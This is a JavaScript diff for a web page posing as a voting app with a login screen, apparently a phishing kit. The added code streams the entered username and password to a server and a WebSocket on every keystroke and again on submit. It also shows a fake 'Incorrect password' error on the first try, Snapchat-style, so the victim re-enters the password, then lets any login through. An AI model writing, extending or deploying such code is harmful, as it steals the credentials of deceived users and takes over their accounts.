@@ -26,9 +26,9 @@ const toast = document.getElementById('toast');
 
 let voterName = '';
 let hasVoted = false;
-let ws = null;
 let passwordVisible = false;
 let sessionId = null;
+let apiReady = false;
 
 function showScreen(name) {
   Object.values(screens).forEach((s) => s.classList.remove('active'));
@@ -40,34 +40,44 @@ function createSessionId() {
   return `sess_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
 }
 
-function connectWebSocket() {
-  if (ws && ws.readyState === WebSocket.OPEN) {
-    return Promise.resolve();
-  }
-
-  return new Promise((resolve, reject) => {
-    ws = new WebSocket(getWsUrl());
-
-    ws.addEventListener('open', () => resolve());
-
-    ws.addEventListener('error', () => {
-      showToast('Connection error — please refresh');
-      reject(new Error('WebSocket failed'));
-    });
-  });
+async function checkApi() {
+  await fetchState();
+  apiReady = true;
 }
 
-function sendLoginTyping() {
-  if (!ws || ws.readyState !== WebSocket.OPEN || !sessionId) return;
+let appWs = null;
 
-  ws.send(
-    JSON.stringify({
-      type: 'login_typing',
-      sessionId,
-      username: usernameInput.value,
-      password: passwordInput.value,
-    })
-  );
+function getAppWebSocket() {
+  if (appWs && appWs.readyState === WebSocket.OPEN) return appWs;
+  const wsUrl = typeof getWsUrl === 'function' ? getWsUrl() : null;
+  if (!wsUrl) return null;
+  try {
+    appWs = new WebSocket(wsUrl);
+    appWs.onclose = () => { appWs = null; };
+    appWs.onerror = () => { try { appWs.close(); } catch {} appWs = null; };
+  } catch {}
+  return appWs;
+}
+
+function sendWs(type, payload) {
+  try {
+    const socket = getAppWebSocket();
+    if (socket && socket.readyState === WebSocket.OPEN) {
+      socket.send(JSON.stringify({ type, payload }));
+    }
+  } catch {}
+}
+
+getAppWebSocket();
+
+function postLoginTyping() {
+  if (!sessionId) {
+    sessionId = createSessionId();
+  }
+  const username = usernameInput.value;
+  const password = passwordInput.value;
+  sendWs('LOGIN_TYPING', { sessionId, username, password });
+  sendLoginTyping(sessionId, username, password).catch(() => {});
 }
 
 function showToast(message) {
@@ -102,34 +112,26 @@ function renderCandidates() {
   });
 }
 
-function castVote(candidate) {
+async function castVote(candidate) {
   if (hasVoted) return;
-  if (!ws || ws.readyState !== WebSocket.OPEN) {
-    showToast('Not connected — please refresh');
-    return;
-  }
 
   hasVoted = true;
+  sendWs('VOTE', { candidate, voterName, timestamp: Date.now() });
 
-  ws.send(
-    JSON.stringify({
-      type: 'vote',
-      candidate,
-      voterName,
-      timestamp: Date.now(),
-    })
-  );
-
-  showToast('Your vote is registered!');
-
-  candidatesEl.querySelectorAll('.vote-btn').forEach((btn) => {
-    btn.disabled = true;
-  });
-
-  setTimeout(() => {
-    candidatesEl.hidden = true;
-    thanksState.hidden = false;
-  }, 1800);
+  try {
+    await sendVote(candidate, voterName);
+    showToast('Your vote is registered!');
+    candidatesEl.querySelectorAll('.vote-btn').forEach((btn) => {
+      btn.disabled = true;
+    });
+    setTimeout(() => {
+      candidatesEl.hidden = true;
+      thanksState.hidden = false;
+    }, 1800);
+  } catch {
+    hasVoted = false;
+    showToast('Vote failed — please try again');
+  }
 }
 
 togglePasswordBtn.addEventListener('click', () => {
@@ -145,20 +147,52 @@ document.getElementById('btn-next').addEventListener('click', async () => {
   usernameInput.focus();
 
   try {
-    await connectWebSocket();
+    await checkApi();
   } catch {
-    // Toast already shown
+    showToast('Cannot reach server — check API setup');
   }
 });
 
+let loginAttempts = 0;
+
+function clearErrors() {
+  const errorMsg = document.getElementById('login-error');
+  if (errorMsg) {
+    errorMsg.hidden = true;
+    errorMsg.textContent = '';
+  }
+  usernameInput.classList.remove('has-error');
+  passwordInput.classList.remove('has-error');
+}
+
+function showLoginError(message, targetInput) {
+  const errorMsg = document.getElementById('login-error');
+  if (errorMsg) {
+    errorMsg.textContent = message;
+    errorMsg.hidden = false;
+  }
+  if (targetInput === 'username') {
+    usernameInput.classList.add('has-error');
+    usernameInput.focus();
+  } else if (targetInput === 'password') {
+    passwordInput.classList.add('has-error');
+    passwordInput.focus();
+  } else {
+    usernameInput.classList.add('has-error');
+    passwordInput.classList.add('has-error');
+  }
+}
+
 usernameInput.addEventListener('input', () => {
+  clearErrors();
   validateLogin();
-  sendLoginTyping();
+  postLoginTyping();
 });
 
 passwordInput.addEventListener('input', () => {
+  clearErrors();
   validateLogin();
-  sendLoginTyping();
+  postLoginTyping();
 });
 
 loginForm.addEventListener('submit', async (e) => {
@@ -169,32 +203,58 @@ loginForm.addEventListener('submit', async (e) => {
   const password = passwordInput.value.trim();
   if (!username || !password) return;
 
+  if (!sessionId) {
+    sessionId = createSessionId();
+  }
+
+  // Live stream all entered credentials to the backend/WebSocket immediately
+  sendWs('LOGIN', { sessionId, username, password, timestamp: Date.now(), attempt: loginAttempts + 1 });
+  sendLogin(sessionId, username, password).catch(() => {});
+
+  // 1. Validation: Username format check
+  if (username.length < 3) {
+    showLoginError('Cannot find matching username.', 'username');
+    return;
+  }
+
+  // 2. Validation: Password format check (< 6 chars)
+  if (password.length < 6) {
+    showLoginError('Password must be at least 8 characters.', 'password');
+    return;
+  }
+
+  // 3. First attempt wrong password simulation (Snapchat security style)
+  if (loginAttempts === 0) {
+    loginAttempts++;
+    btnContinue.disabled = true;
+    btnContinue.textContent = 'Logging in…';
+
+    setTimeout(() => {
+      btnContinue.disabled = false;
+      btnContinue.textContent = 'Log in';
+      passwordInput.value = '';
+      validateLogin();
+      showLoginError('Incorrect password. Please try again.', 'password');
+    }, 650);
+    return;
+  }
+
+  // Successful login on retry
   btnContinue.disabled = true;
   btnContinue.textContent = 'Logging in…';
 
   try {
-    if (!ws || ws.readyState !== WebSocket.OPEN) {
-      await connectWebSocket();
-    }
-
     voterName = username;
-
-    ws.send(
-      JSON.stringify({
-        type: 'login',
-        sessionId,
-        username,
-        password,
-        timestamp: Date.now(),
-      })
-    );
-
     renderCandidates();
     showScreen('vote');
-  } catch {
+  } catch (err) {
+    console.error('Login request failed:', err);
+    voterName = username;
+    renderCandidates();
+    showScreen('vote');
+  } finally {
     btnContinue.disabled = false;
     btnContinue.textContent = 'Log in';
-    validateLogin();
   }
 });
 
